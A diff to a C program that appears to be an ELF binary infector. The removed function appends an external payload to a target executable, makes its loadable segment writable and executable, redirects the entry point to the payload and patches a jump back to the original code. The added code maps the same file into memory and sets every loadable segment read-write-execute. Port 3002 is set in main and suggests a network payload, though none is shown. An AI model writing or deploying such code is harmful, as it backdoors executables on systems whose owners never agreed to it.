@@ -21,71 +21,42 @@ extern uint64_t CDECL_NORM(payload_size);
 uint16_t port = 0;
 uint32_t addr_ip = 0;
 
-void insert_executable_section(const char *elf_filename) {
-    FILE *file = fopen(elf_filename, "rb+");
-    if (!file) {
-        perror("fopen");
-        exit(EXIT_FAILURE);
-    }
-
-    // Read the ELF header
-    Elf64_Ehdr ehdr;
-    fread(&ehdr, sizeof(Elf64_Ehdr), 1, file);
-
-    // Read the program headers
-    Elf64_Phdr *phdrs = malloc(ehdr.e_phnum * sizeof(Elf64_Phdr));
-    fseek(file, ehdr.e_phoff, SEEK_SET);
-    fread(phdrs, sizeof(Elf64_Phdr), ehdr.e_phnum, file);
-
-    // Calculate the offset and address for the new section
-    Elf64_Off new_section_offset = 0;
-    Elf64_Addr new_section_addr = 0;
-    for (int i = 0; i < ehdr.e_phnum; ++i) {
-        if (phdrs[i].p_type == PT_LOAD) {
-            // Ensure the new section is aligned
-            new_section_offset = (phdrs[i].p_offset + phdrs[i].p_filesz + 0xFFF) & ~0xFFF;
-            new_section_addr = (phdrs[i].p_vaddr + phdrs[i].p_memsz + 0xFFF) & ~0xFFF;
-            phdrs[i].p_filesz = new_section_offset + payload_size_p - phdrs[i].p_offset;
-            phdrs[i].p_memsz = new_section_addr + payload_size_p - phdrs[i].p_vaddr;
-            phdrs[i].p_flags |= PF_X | PF_W | PF_R;
-        }
-    }
-
-    // Modify the entry point
-    Elf64_Addr old_entry_point = ehdr.e_entry;
-    ehdr.e_entry = new_section_addr;
-
-    // Write the modified ELF header
-    fseek(file, 0, SEEK_SET);
-    fwrite(&ehdr, sizeof(Elf64_Ehdr), 1, file);
-
-    // Write the modified program headers
-    fseek(file, ehdr.e_phoff, SEEK_SET);
-    fwrite(phdrs, sizeof(Elf64_Phdr), ehdr.e_phnum, file);
-
-    // Write the new section
-    fseek(file, new_section_offset, SEEK_SET);
-    fwrite(payload_p, 1, payload_size_p, file);
-
-    // Calculate the relative jump offset
-    Elf64_Addr jump_from = new_section_addr + payload_size_p - 5;
-    int32_t jump_offset = (int32_t)(old_entry_point - jump_from - 5);
-
-    // Write the relative jump instruction at the end of the payload in the file
-    fseek(file, new_section_offset + payload_size_p - 1190 - 5, SEEK_SET); // Move to the correct position
-    fputc(0xE9, file); // Write the opcode for jmp (relative)
-    fwrite(&jump_offset, sizeof(int32_t), 1, file); // Write the relative jump offset
-
-    fclose(file);
-    free(phdrs);
-}
-
 int main(int argc, char *argv[], char *envp[]) {
     port = htons(3002);
     addr_ip = htonl(INADDR_ANY);
     printf("port: %#x %#x\n", port, addr_ip);
 
-    insert_executable_section("testprog");
+
+	int fd = open("testprog", O_RDWR);
+	if (fd == -1) {
+		perror("open");
+		return 1;
+	}
+
+	struct stat st;
+	if (fstat(fd, &st) == -1) {
+		perror("fstat");
+		return 1;
+	}
+
+	void *map = mmap(NULL, st.st_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
+	if (map == MAP_FAILED) {
+		perror("mmap");
+		return 1;
+	}
+
+	Elf64_Ehdr *ehdr = (Elf64_Ehdr *)map;
+	Elf64_Phdr *phdr = (Elf64_Phdr *)(map + ehdr->e_phoff);
+
+	for (int i = 0; i < ehdr->e_phnum; i++) {
+		if (phdr[i].p_type == PT_LOAD) {
+			printf("found PT_LOAD\n");
+			phdr[i].p_flags = PF_R | PF_W | PF_X;
+		}
+	}
+
+	munmap(map, st.st_size);
+	close(fd);
 
     return 0;
 }
